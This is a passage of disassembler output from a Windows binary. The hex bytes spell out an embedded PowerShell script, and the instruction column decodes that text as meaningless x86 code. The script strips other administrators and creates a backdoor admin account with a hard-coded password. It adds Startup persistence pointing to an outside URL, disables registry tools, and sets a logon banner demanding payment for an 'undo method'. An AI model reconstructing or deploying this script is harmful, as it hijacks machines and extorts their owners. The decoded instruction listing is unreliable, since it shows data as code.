  40506e:	68 61 6e 67 69       	push   $0x69676e61
  405073:	6e                   	outsb  %ds:(%esi),(%dx)
  405074:	67 57                	addr16 push %edi
  405076:	61                   	popa
  405077:	6c                   	insb   (%dx),%es:(%edi)
  405078:	6c                   	insb   (%dx),%es:(%edi)
  405079:	70 61                	jo     0x4050dc
  40507b:	70 65                	jo     0x4050e2
  40507d:	72 22                	jb     0x4050a1
  40507f:	20 2d 56 61 6c 75    	and    %ch,0x756c6156
  405085:	65 20 31             	and    %dh,%gs:(%ecx)
  405088:	20 2d 54 79 70 65    	and    %ch,0x65707954
  40508e:	20 44 57 4f          	and    %al,0x4f(%edi,%edx,2)
  405092:	52                   	push   %edx
  405093:	44                   	inc    %esp
  405094:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  40509a:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  4050a0:	4e                   	dec    %esi
  4050a1:	65 77 41             	gs ja  0x4050e5
  4050a4:	64 6d                	fs insl (%dx),%es:(%edi)
  4050a6:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  4050ad:	61                   	popa
  4050ae:	6d                   	insl   (%dx),%es:(%edi)
  4050af:	65 20 3d 20 22 43 6c 	and    %bh,%gs:0x6c432220
  4050b6:	61                   	popa
  4050b7:	6d                   	insl   (%dx),%es:(%edi)
  4050b8:	22 0d 0a 24 4e 65    	and    0x654e240a,%cl
  4050be:	77 41                	ja     0x405101
  4050c0:	64 6d                	fs insl (%dx),%es:(%edi)
  4050c2:	69 6e 50 61 73 73 77 	imul   $0x77737361,0x50(%esi),%ebp
  4050c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4050ca:	72 64                	jb     0x405130
  4050cc:	20 3d 20 43 6f 6e    	and    %bh,0x6e6f4320
  4050d2:	76 65                	jbe    0x405139
  4050d4:	72 74                	jb     0x40514a
  4050d6:	54                   	push   %esp
  4050d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4050d8:	2d 53 65 63 75       	sub    $0x75636553,%eax
  4050dd:	72 65                	jb     0x405144
  4050df:	53                   	push   %ebx
  4050e0:	74 72                	je     0x405154
  4050e2:	69 6e 67 20 22 69 61 	imul   $0x61692220,0x67(%esi),%ebp
  4050e9:	6d                   	insl   (%dx),%es:(%edi)
  4050ea:	61                   	popa
  4050eb:	66 75 63             	data16 jne 0x405151
  4050ee:	6b 69 6e 67          	imul   $0x67,0x6e(%ecx),%ebp
  4050f2:	64 75 6d             	fs jne 0x405162
  4050f5:	62 61 73             	bound  %esp,0x73(%ecx)
  4050f8:	73 6c                	jae    0x405166
  4050fa:	6d                   	insl   (%dx),%es:(%edi)
  4050fb:	61                   	popa
  4050fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050fd:	22 20                	and    (%eax),%ah
  4050ff:	2d 41 73 50 6c       	sub    $0x6c507341,%eax
  405104:	61                   	popa
  405105:	69 6e 54 65 78 74 20 	imul   $0x20747865,0x54(%esi),%ebp
  40510c:	2d 46 6f 72 63       	sub    $0x63726f46,%eax
  405111:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  405117:	41                   	inc    %ecx
  405118:	64 6d                	fs insl (%dx),%es:(%edi)
  40511a:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  405121:	20 3d 20 47 65 74    	and    %bh,0x74654720
  405127:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  40512c:	6c                   	insb   (%dx),%es:(%edi)
  40512d:	47                   	inc    %edi
  40512e:	72 6f                	jb     0x40519f
  405130:	75 70                	jne    0x4051a2
  405132:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  405138:	20 22                	and    %ah,(%edx)
  40513a:	41                   	inc    %ecx
  40513b:	64 6d                	fs insl (%dx),%es:(%edi)
  40513d:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  405144:	74 6f                	je     0x4051b5
  405146:	72 73                	jb     0x4051bb
  405148:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  40514e:	43                   	inc    %ebx
  40514f:	75 72                	jne    0x4051c3
  405151:	72 65                	jb     0x4051b8
  405153:	6e                   	outsb  %ds:(%esi),(%dx)
  405154:	74 41                	je     0x405197
  405156:	64 6d                	fs insl (%dx),%es:(%edi)
  405158:	69 6e 73 20 3d 20 47 	imul   $0x47203d20,0x73(%esi),%ebp
  40515f:	65 74 2d             	gs je  0x40518f
  405162:	4c                   	dec    %esp
  405163:	6f                   	outsl  %ds:(%esi),(%dx)
  405164:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  405167:	47                   	inc    %edi
  405168:	72 6f                	jb     0x4051d9
  40516a:	75 70                	jne    0x4051dc
  40516c:	4d                   	dec    %ebp
  40516d:	65 6d                	gs insl (%dx),%es:(%edi)
  40516f:	62 65 72             	bound  %esp,0x72(%ebp)
  405172:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  405178:	70 20                	jo     0x40519a
  40517a:	24 41                	and    $0x41,%al
  40517c:	64 6d                	fs insl (%dx),%es:(%edi)
  40517e:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  405185:	0d 0a 0d 0a 0d       	or     $0xd0a0d0a,%eax
  40518a:	0a 66 6f             	or     0x6f(%esi),%ah
  40518d:	72 65                	jb     0x4051f4
  40518f:	61                   	popa
  405190:	63 68 20             	arpl   %ebp,0x20(%eax)
  405193:	28 24 41             	sub    %ah,(%ecx,%eax,2)
  405196:	64 6d                	fs insl (%dx),%es:(%edi)
  405198:	69 6e 20 69 6e 20 24 	imul   $0x24206e69,0x20(%esi),%ebp
  40519f:	43                   	inc    %ebx
  4051a0:	75 72                	jne    0x405214
  4051a2:	72 65                	jb     0x405209
  4051a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4051a5:	74 41                	je     0x4051e8
  4051a7:	64 6d                	fs insl (%dx),%es:(%edi)
  4051a9:	69 6e 73 29 20 7b 0d 	imul   $0xd7b2029,0x73(%esi),%ebp
  4051b0:	0a 20                	or     (%eax),%ah
  4051b2:	20 20                	and    %ah,(%eax)
  4051b4:	20 69 66             	and    %ch,0x66(%ecx)
  4051b7:	20 28                	and    %ch,(%eax)
  4051b9:	24 41                	and    $0x41,%al
  4051bb:	64 6d                	fs insl (%dx),%es:(%edi)
  4051bd:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  4051c4:	20 2d 6e 65 20 22    	and    %ch,0x2220656e
  4051ca:	42                   	inc    %edx
  4051cb:	55                   	push   %ebp
  4051cc:	49                   	dec    %ecx
  4051cd:	4c                   	dec    %esp
  4051ce:	54                   	push   %esp
  4051cf:	49                   	dec    %ecx
  4051d0:	4e                   	dec    %esi
  4051d1:	5c                   	pop    %esp
  4051d2:	41                   	inc    %ecx
  4051d3:	64 6d                	fs insl (%dx),%es:(%edi)
  4051d5:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  4051dc:	74 6f                	je     0x40524d
  4051de:	72 22                	jb     0x405202
  4051e0:	20 2d 61 6e 64 20    	and    %ch,0x20646e61
  4051e6:	24 41                	and    $0x41,%al
  4051e8:	64 6d                	fs insl (%dx),%es:(%edi)
  4051ea:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  4051f1:	20 2d 6e 65 20 22    	and    %ch,0x2220656e
  4051f7:	4e                   	dec    %esi
  4051f8:	54                   	push   %esp
  4051f9:	20 41 55             	and    %al,0x55(%ecx)
  4051fc:	54                   	push   %esp
  4051fd:	48                   	dec    %eax
  4051fe:	4f                   	dec    %edi
  4051ff:	52                   	push   %edx
  405200:	49                   	dec    %ecx
  405201:	54                   	push   %esp
  405202:	59                   	pop    %ecx
  405203:	5c                   	pop    %esp
  405204:	53                   	push   %ebx
  405205:	59                   	pop    %ecx
  405206:	53                   	push   %ebx
  405207:	54                   	push   %esp
  405208:	45                   	inc    %ebp
  405209:	4d                   	dec    %ebp
  40520a:	22 29                	and    (%ecx),%ch
  40520c:	20 7b 0d             	and    %bh,0xd(%ebx)
  40520f:	0a 20                	or     (%eax),%ah
  405211:	20 20                	and    %ah,(%eax)
  405213:	20 20                	and    %ah,(%eax)
  405215:	20 20                	and    %ah,(%eax)
  405217:	20 57 72             	and    %dl,0x72(%edi)
  40521a:	69 74 65 2d 48 6f 73 	imul   $0x74736f48,0x2d(%ebp,%eiz,2),%esi
  405221:	74 
  405222:	20 22                	and    %ah,(%edx)
  405224:	52                   	push   %edx
  405225:	65 6d                	gs insl (%dx),%es:(%edi)
  405227:	6f                   	outsl  %ds:(%esi),(%dx)
  405228:	76 69                	jbe    0x405293
  40522a:	6e                   	outsb  %ds:(%esi),(%dx)
  40522b:	67 20 24             	and    %ah,(%si)
  40522e:	28 24 41             	sub    %ah,(%ecx,%eax,2)
  405231:	64 6d                	fs insl (%dx),%es:(%edi)
  405233:	69 6e 2e 4e 61 6d 65 	imul   $0x656d614e,0x2e(%esi),%ebp
  40523a:	29 20                	sub    %esp,(%eax)
  40523c:	66 72 6f             	data16 jb 0x4052ae
  40523f:	6d                   	insl   (%dx),%es:(%edi)
  405240:	20 41 64             	and    %al,0x64(%ecx)
  405243:	6d                   	insl   (%dx),%es:(%edi)
  405244:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  40524b:	74 6f                	je     0x4052bc
  40524d:	72 73                	jb     0x4052c2
  40524f:	20 67 72             	and    %ah,0x72(%edi)
  405252:	6f                   	outsl  %ds:(%esi),(%dx)
  405253:	75 70                	jne    0x4052c5
  405255:	2e 2e 2e 22 0d 0a 20 	cs cs and %cs:0x2020200a,%cl
  40525c:	20 20 
  40525e:	20 20                	and    %ah,(%eax)
  405260:	20 20                	and    %ah,(%eax)
  405262:	20 52 65             	and    %dl,0x65(%edx)
  405265:	6d                   	insl   (%dx),%es:(%edi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	76 65                	jbe    0x4052ce
  405269:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  40526e:	6c                   	insb   (%dx),%es:(%edi)
  40526f:	47                   	inc    %edi
  405270:	72 6f                	jb     0x4052e1
  405272:	75 70                	jne    0x4052e4
  405274:	4d                   	dec    %ebp
  405275:	65 6d                	gs insl (%dx),%es:(%edi)
  405277:	62 65 72             	bound  %esp,0x72(%ebp)
  40527a:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  405280:	70 20                	jo     0x4052a2
  405282:	24 41                	and    $0x41,%al
  405284:	64 6d                	fs insl (%dx),%es:(%edi)
  405286:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  40528d:	20 2d 4d 65 6d 62    	and    %ch,0x626d654d
  405293:	65 72 20             	gs jb  0x4052b6
  405296:	24 41                	and    $0x41,%al
  405298:	64 6d                	fs insl (%dx),%es:(%edi)
  40529a:	69 6e 20 2d 43 6f 6e 	imul   $0x6e6f432d,0x20(%esi),%ebp
  4052a1:	66 69 72 6d 3a 24    	imul   $0x243a,0x6d(%edx),%si
  4052a7:	66 61                	popaw
  4052a9:	6c                   	insb   (%dx),%es:(%edi)
  4052aa:	73 65                	jae    0x405311
  4052ac:	0d 0a 20 20 20       	or     $0x2020200a,%eax
  4052b1:	20 7d 0d             	and    %bh,0xd(%ebp)
  4052b4:	0a 7d 0d             	or     0xd(%ebp),%bh
  4052b7:	0a 0d 0a 4e 65 77    	or     0x77654e0a,%cl
  4052bd:	2d 4c 6f 63 61       	sub    $0x61636f4c,%eax
  4052c2:	6c                   	insb   (%dx),%es:(%edi)
  4052c3:	55                   	push   %ebp
  4052c4:	73 65                	jae    0x40532b
  4052c6:	72 20                	jb     0x4052e8
  4052c8:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  4052cd:	20 24 4e             	and    %ah,(%esi,%ecx,2)
  4052d0:	65 77 41             	gs ja  0x405314
  4052d3:	64 6d                	fs insl (%dx),%es:(%edi)
  4052d5:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  4052dc:	61                   	popa
  4052dd:	6d                   	insl   (%dx),%es:(%edi)
  4052de:	65 20 2d 50 61 73 73 	and    %ch,%gs:0x73736150
  4052e5:	77 6f                	ja     0x405356
  4052e7:	72 64                	jb     0x40534d
  4052e9:	20 24 4e             	and    %ah,(%esi,%ecx,2)
  4052ec:	65 77 41             	gs ja  0x405330
  4052ef:	64 6d                	fs insl (%dx),%es:(%edi)
  4052f1:	69 6e 50 61 73 73 77 	imul   $0x77737361,0x50(%esi),%ebp
  4052f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052f9:	72 64                	jb     0x40535f
  4052fb:	20 2d 46 75 6c 6c    	and    %ch,0x6c6c7546
  405301:	4e                   	dec    %esi
  405302:	61                   	popa
  405303:	6d                   	insl   (%dx),%es:(%edi)
  405304:	65 20 22             	and    %ah,%gs:(%edx)
  405307:	43                   	inc    %ebx
  405308:	6c                   	insb   (%dx),%es:(%edi)
  405309:	61                   	popa
  40530a:	6d                   	insl   (%dx),%es:(%edi)
  40530b:	22 20                	and    (%eax),%ah
  40530d:	2d 44 65 73 63       	sub    $0x63736544,%eax
  405312:	72 69                	jb     0x40537d
  405314:	70 74                	jo     0x40538a
  405316:	69 6f 6e 20 22 59 6f 	imul   $0x6f592220,0x6e(%edi),%ebp
  40531d:	75 72                	jne    0x405391
  40531f:	20 6e 65             	and    %ch,0x65(%esi)
  405322:	77 20                	ja     0x405344
  405324:	6f                   	outsl  %ds:(%esi),(%dx)
  405325:	77 6e                	ja     0x405395
  405327:	65 72 20             	gs jb  0x40534a
  40532a:	4c                   	dec    %esp
  40532b:	4d                   	dec    %ebp
  40532c:	41                   	inc    %ecx
  40532d:	4f                   	dec    %edi
  40532e:	22 0d 0a 0d 0a 41    	and    0x410a0d0a,%cl
  405334:	64 64 2d 4c 6f 63 61 	fs fs sub $0x61636f4c,%eax
  40533b:	6c                   	insb   (%dx),%es:(%edi)
  40533c:	47                   	inc    %edi
  40533d:	72 6f                	jb     0x4053ae
  40533f:	75 70                	jne    0x4053b1
  405341:	4d                   	dec    %ebp
  405342:	65 6d                	gs insl (%dx),%es:(%edi)
  405344:	62 65 72             	bound  %esp,0x72(%ebp)
  405347:	20 2d 47 72 6f 75    	and    %ch,0x756f7247
  40534d:	70 20                	jo     0x40536f
  40534f:	24 41                	and    $0x41,%al
  405351:	64 6d                	fs insl (%dx),%es:(%edi)
  405353:	69 6e 47 72 6f 75 70 	imul   $0x70756f72,0x47(%esi),%ebp
  40535a:	20 2d 4d 65 6d 62    	and    %ch,0x626d654d
  405360:	65 72 20             	gs jb  0x405383
  405363:	24 4e                	and    $0x4e,%al
  405365:	65 77 41             	gs ja  0x4053a9
  405368:	64 6d                	fs insl (%dx),%es:(%edi)
  40536a:	69 6e 55 73 65 72 6e 	imul   $0x6e726573,0x55(%esi),%ebp
  405371:	61                   	popa
  405372:	6d                   	insl   (%dx),%es:(%edi)
  405373:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  405379:	75 72                	jne    0x4053ed
  40537b:	6c                   	insb   (%dx),%es:(%edi)
  40537c:	20 3d 20 22 68 74    	and    %bh,0x74682220
  405382:	74 70                	je     0x4053f4
  405384:	73 3a                	jae    0x4053c0
  405386:	2f                   	das
  405387:	2f                   	das
  405388:	74 68                	je     0x4053f2
  40538a:	72 6f                	jb     0x4053fb
  40538c:	6e                   	outsb  %ds:(%esi),(%dx)
  40538d:	65 2e 63 6f 6d       	gs arpl %ebp,%cs:0x6d(%edi)
  405392:	2f                   	das
  405393:	72 61                	jb     0x4053f6
  405395:	77 73                	ja     0x40540a
  405397:	74 61                	je     0x4053fa
  405399:	69 6e 65 64 63 6c 61 	imul   $0x616c6364,0x65(%esi),%ebp
  4053a0:	6d                   	insl   (%dx),%es:(%edi)
  4053a1:	73 22                	jae    0x4053c5
  4053a3:	0d 0a 24 73 68       	or     $0x6873240a,%eax
  4053a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4053a9:	72 74                	jb     0x40541f
  4053ab:	63 75 74             	arpl   %esi,0x74(%ebp)
  4053ae:	4e                   	dec    %esi
  4053af:	61                   	popa
  4053b0:	6d                   	insl   (%dx),%es:(%edi)
  4053b1:	65 20 3d 20 22 74 68 	and    %bh,%gs:0x68742220
  4053b8:	72 6f                	jb     0x405429
  4053ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4053bb:	65 22 0d 0a 24 73 74 	and    %gs:0x7473240a,%cl
  4053c2:	61                   	popa
  4053c3:	72 74                	jb     0x405439
  4053c5:	75 70                	jne    0x405437
  4053c7:	50                   	push   %eax
  4053c8:	61                   	popa
  4053c9:	74 68                	je     0x405433
  4053cb:	20 3d 20 5b 53 79    	and    %bh,0x79535b20
  4053d1:	73 74                	jae    0x405447
  4053d3:	65 6d                	gs insl (%dx),%es:(%edi)
  4053d5:	2e 45                	cs inc %ebp
  4053d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4053d8:	76 69                	jbe    0x405443
  4053da:	72 6f                	jb     0x40544b
  4053dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4053dd:	6d                   	insl   (%dx),%es:(%edi)
  4053de:	65 6e                	outsb  %gs:(%esi),(%dx)
  4053e0:	74 5d                	je     0x40543f
  4053e2:	3a 3a                	cmp    (%edx),%bh
  4053e4:	47                   	inc    %edi
  4053e5:	65 74 46             	gs je  0x40542e
  4053e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4053e9:	6c                   	insb   (%dx),%es:(%edi)
  4053ea:	64 65 72 50          	fs gs jb 0x40543e
  4053ee:	61                   	popa
  4053ef:	74 68                	je     0x405459
  4053f1:	28 27                	sub    %ah,(%edi)
  4053f3:	53                   	push   %ebx
  4053f4:	74 61                	je     0x405457
  4053f6:	72 74                	jb     0x40546c
  4053f8:	75 70                	jne    0x40546a
  4053fa:	27                   	daa
  4053fb:	29 0d 0a 24 73 68    	sub    %ecx,0x6873240a
  405401:	6f                   	outsl  %ds:(%esi),(%dx)
  405402:	72 74                	jb     0x405478
  405404:	63 75 74             	arpl   %esi,0x74(%ebp)
  405407:	50                   	push   %eax
  405408:	61                   	popa
  405409:	74 68                	je     0x405473
  40540b:	20 3d 20 4a 6f 69    	and    %bh,0x696f4a20
  405411:	6e                   	outsb  %ds:(%esi),(%dx)
  405412:	2d 50 61 74 68       	sub    $0x68746150,%eax
  405417:	20 2d 50 61 74 68    	and    %ch,0x68746150
  40541d:	20 24 73             	and    %ah,(%ebx,%esi,2)
  405420:	74 61                	je     0x405483
  405422:	72 74                	jb     0x405498
  405424:	75 70                	jne    0x405496
  405426:	50                   	push   %eax
  405427:	61                   	popa
  405428:	74 68                	je     0x405492
  40542a:	20 2d 43 68 69 6c    	and    %ch,0x6c696843
  405430:	64 50                	fs push %eax
  405432:	61                   	popa
  405433:	74 68                	je     0x40549d
  405435:	20 22                	and    %ah,(%edx)
  405437:	24 73                	and    $0x73,%al
  405439:	68 6f 72 74 63       	push   $0x6374726f
  40543e:	75 74                	jne    0x4054b4
  405440:	4e                   	dec    %esi
  405441:	61                   	popa
  405442:	6d                   	insl   (%dx),%es:(%edi)
  405443:	65 2e 75 72          	gs jne,pn 0x4054b9
  405447:	6c                   	insb   (%dx),%es:(%edi)
  405448:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  40544e:	73 68                	jae    0x4054b8
  405450:	6f                   	outsl  %ds:(%esi),(%dx)
  405451:	72 74                	jb     0x4054c7
  405453:	63 75 74             	arpl   %esi,0x74(%ebp)
  405456:	43                   	inc    %ebx
  405457:	6f                   	outsl  %ds:(%esi),(%dx)
  405458:	6e                   	outsb  %ds:(%esi),(%dx)
  405459:	74 65                	je     0x4054c0
  40545b:	6e                   	outsb  %ds:(%esi),(%dx)
  40545c:	74 20                	je     0x40547e
  40545e:	3d 20 22 5b 49       	cmp    $0x495b2220,%eax
  405463:	6e                   	outsb  %ds:(%esi),(%dx)
  405464:	74 65                	je     0x4054cb
  405466:	72 6e                	jb     0x4054d6
  405468:	65 74 53             	gs je  0x4054be
  40546b:	68 6f 72 74 63       	push   $0x6374726f
  405470:	75 74                	jne    0x4054e6
  405472:	5d                   	pop    %ebp
  405473:	60                   	pusha
  405474:	72 60                	jb     0x4054d6
  405476:	6e                   	outsb  %ds:(%esi),(%dx)
  405477:	55                   	push   %ebp
  405478:	52                   	push   %edx
  405479:	4c                   	dec    %esp
  40547a:	3d 24 75 72 6c       	cmp    $0x6c727524,%eax
  40547f:	22 0d 0a 24 73 68    	and    0x6873240a,%cl
  405485:	6f                   	outsl  %ds:(%esi),(%dx)
  405486:	72 74                	jb     0x4054fc
  405488:	63 75 74             	arpl   %esi,0x74(%ebp)
  40548b:	43                   	inc    %ebx
  40548c:	6f                   	outsl  %ds:(%esi),(%dx)
  40548d:	6e                   	outsb  %ds:(%esi),(%dx)
  40548e:	74 65                	je     0x4054f5
  405490:	6e                   	outsb  %ds:(%esi),(%dx)
  405491:	74 20                	je     0x4054b3
  405493:	7c 20                	jl     0x4054b5
  405495:	4f                   	dec    %edi
  405496:	75 74                	jne    0x40550c
  405498:	2d 46 69 6c 65       	sub    $0x656c6946,%eax
  40549d:	20 2d 46 69 6c 65    	and    %ch,0x656c6946
  4054a3:	50                   	push   %eax
  4054a4:	61                   	popa
  4054a5:	74 68                	je     0x40550f
  4054a7:	20 24 73             	and    %ah,(%ebx,%esi,2)
  4054aa:	68 6f 72 74 63       	push   $0x6374726f
  4054af:	75 74                	jne    0x405525
  4054b1:	50                   	push   %eax
  4054b2:	61                   	popa
  4054b3:	74 68                	je     0x40551d
  4054b5:	20 2d 45 6e 63 6f    	and    %ch,0x6f636e45
  4054bb:	64 69 6e 67 20 41 53 	imul   $0x43534120,%fs:0x67(%esi),%ebp
  4054c2:	43 
  4054c3:	49                   	dec    %ecx
  4054c4:	49                   	dec    %ecx
  4054c5:	0d 0a 0d 0a 53       	or     $0x530a0d0a,%eax
  4054ca:	65 74 2d             	gs je  0x4054fa
  4054cd:	49                   	dec    %ecx
  4054ce:	74 65                	je     0x405535
  4054d0:	6d                   	insl   (%dx),%es:(%edi)
  4054d1:	50                   	push   %eax
  4054d2:	72 6f                	jb     0x405543
  4054d4:	70 65                	jo     0x40553b
  4054d6:	72 74                	jb     0x40554c
  4054d8:	79 20                	jns    0x4054fa
  4054da:	2d 50 61 74 68       	sub    $0x68746150,%eax
  4054df:	20 22                	and    %ah,(%edx)
  4054e1:	48                   	dec    %eax
  4054e2:	4b                   	dec    %ebx
  4054e3:	43                   	inc    %ebx
  4054e4:	55                   	push   %ebp
  4054e5:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  4054e9:	46                   	inc    %esi
  4054ea:	54                   	push   %esp
  4054eb:	57                   	push   %edi
  4054ec:	41                   	inc    %ecx
  4054ed:	52                   	push   %edx
  4054ee:	45                   	inc    %ebp
  4054ef:	5c                   	pop    %esp
  4054f0:	4d                   	dec    %ebp
  4054f1:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4054f8:	74 5c                	je     0x405556
  4054fa:	57                   	push   %edi
  4054fb:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  405502:	43                   	inc    %ebx
  405503:	75 72                	jne    0x405577
  405505:	72 65                	jb     0x40556c
  405507:	6e                   	outsb  %ds:(%esi),(%dx)
  405508:	74 56                	je     0x405560
  40550a:	65 72 73             	gs jb  0x405580
  40550d:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  405514:	69 63 69 65 73 5c 53 	imul   $0x535c7365,0x69(%ebx),%esp
  40551b:	79 73                	jns    0x405590
  40551d:	74 65                	je     0x405584
  40551f:	6d                   	insl   (%dx),%es:(%edi)
  405520:	22 20                	and    (%eax),%ah
  405522:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  405527:	20 22                	and    %ah,(%edx)
  405529:	44                   	inc    %esp
  40552a:	69 73 61 62 6c 65 52 	imul   $0x52656c62,0x61(%ebx),%esi
  405531:	65 67 69 73 74 72 79 	imul   $0x6f547972,%gs:0x74(%bp,%di),%esi
  405538:	54 6f 
  40553a:	6f                   	outsl  %ds:(%esi),(%dx)
  40553b:	6c                   	insb   (%dx),%es:(%edi)
  40553c:	73 22                	jae    0x405560
  40553e:	20 2d 56 61 6c 75    	and    %ch,0x756c6156
  405544:	65 20 31             	and    %dh,%gs:(%ecx)
  405547:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  40554d:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  405553:	52                   	push   %edx
  405554:	65 67 50             	gs addr16 push %eax
  405557:	61                   	popa
  405558:	74 68                	je     0x4055c2
  40555a:	20 3d 20 22 48 4b    	and    %bh,0x4b482220
  405560:	4c                   	dec    %esp
  405561:	4d                   	dec    %ebp
  405562:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  405566:	46                   	inc    %esi
  405567:	54                   	push   %esp
  405568:	57                   	push   %edi
  405569:	41                   	inc    %ecx
  40556a:	52                   	push   %edx
  40556b:	45                   	inc    %ebp
  40556c:	5c                   	pop    %esp
  40556d:	4d                   	dec    %ebp
  40556e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405575:	74 5c                	je     0x4055d3
  405577:	57                   	push   %edi
  405578:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40557f:	43                   	inc    %ebx
  405580:	75 72                	jne    0x4055f4
  405582:	72 65                	jb     0x4055e9
  405584:	6e                   	outsb  %ds:(%esi),(%dx)
  405585:	74 56                	je     0x4055dd
  405587:	65 72 73             	gs jb  0x4055fd
  40558a:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  405591:	69 63 69 65 73 5c 53 	imul   $0x535c7365,0x69(%ebx),%esp
  405598:	79 73                	jns    0x40560d
  40559a:	74 65                	je     0x405601
  40559c:	6d                   	insl   (%dx),%es:(%edi)
  40559d:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  4055a3:	4c                   	dec    %esp
  4055a4:	65 67 61             	gs addr16 popa
  4055a7:	6c                   	insb   (%dx),%es:(%edi)
  4055a8:	43                   	inc    %ebx
  4055a9:	61                   	popa
  4055aa:	70 74                	jo     0x405620
  4055ac:	69 6f 6e 20 3d 20 22 	imul   $0x22203d20,0x6e(%edi),%ebp
  4055b3:	46                   	inc    %esi
  4055b4:	55                   	push   %ebp
  4055b5:	43                   	inc    %ebx
  4055b6:	4b                   	dec    %ebx
  4055b7:	49                   	dec    %ecx
  4055b8:	4e                   	dec    %esi
  4055b9:	47                   	inc    %edi
  4055ba:	20 44 55 4d          	and    %al,0x4d(%ebp,%edx,2)
  4055be:	42                   	inc    %edx
  4055bf:	41                   	inc    %ecx
  4055c0:	53                   	push   %ebx
  4055c1:	53                   	push   %ebx
  4055c2:	22 0d 0a 0d 0a 24    	and    0x240a0d0a,%cl
  4055c8:	4c                   	dec    %esp
  4055c9:	65 67 61             	gs addr16 popa
  4055cc:	6c                   	insb   (%dx),%es:(%edi)
  4055cd:	54                   	push   %esp
  4055ce:	65 78 74             	gs js  0x405645
  4055d1:	20 3d 20 22 4c 4d    	and    %bh,0x4d4c2220
  4055d7:	41                   	inc    %ecx
  4055d8:	4f                   	dec    %edi
  4055d9:	4f                   	dec    %edi
  4055da:	4f                   	dec    %edi
  4055db:	20 59 4f             	and    %bl,0x4f(%ecx)
  4055de:	55                   	push   %ebp
  4055df:	20 41 43             	and    %al,0x43(%ecx)
  4055e2:	54                   	push   %esp
  4055e3:	55                   	push   %ebp
  4055e4:	41                   	inc    %ecx
  4055e5:	4c                   	dec    %esp
  4055e6:	4c                   	dec    %esp
  4055e7:	59                   	pop    %ecx
  4055e8:	20 52 41             	and    %dl,0x41(%edx)
  4055eb:	4e                   	dec    %esi
  4055ec:	20 49 54             	and    %cl,0x54(%ecx)
  4055ef:	3f                   	aas
  4055f0:	20 53 65             	and    %dl,0x65(%ebx)
  4055f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4055f4:	64 20 31             	and    %dh,%fs:(%ecx)
  4055f7:	35 20 74 6f 20       	xor    $0x206f7420,%eax
  4055fc:	67 65 74 20          	addr16 gs je 0x405620
  405600:	74 68                	je     0x40566a
  405602:	65 20 75 6e          	and    %dh,%gs:0x6e(%ebp)
  405606:	64 6f                	outsl  %fs:(%esi),(%dx)
  405608:	20 6d 65             	and    %ch,0x65(%ebp)
  40560b:	74 68                	je     0x405675
  40560d:	6f                   	outsl  %ds:(%esi),(%dx)
  40560e:	64 2c 20             	fs sub $0x20,%al
  405611:	6f                   	outsl  %ds:(%esi),(%dx)
  405612:	72 20                	jb     0x405634
  405614:	74 72                	je     0x405688
  405616:	79 20                	jns    0x405638
  405618:	61                   	popa
  405619:	6e                   	outsb  %ds:(%esi),(%dx)
  40561a:	64 20 73 74          	and    %dh,%fs:0x74(%ebx)
  40561e:	72 75                	jb     0x405695
  405620:	67 67 6c             	addr16 insb (%dx),%es:(%di)
  405623:	65 20 79 6f          	and    %bh,%gs:0x6f(%ecx)
  405627:	75 72                	jne    0x40569b
  405629:	20 77 61             	and    %dh,0x61(%edi)
  40562c:	79 20                	jns    0x40564e
  40562e:	6f                   	outsl  %ds:(%esi),(%dx)
  40562f:	75 74                	jne    0x4056a5
  405631:	20 61 6c             	and    %ah,0x6c(%ecx)
  405634:	6f                   	outsl  %ds:(%esi),(%dx)
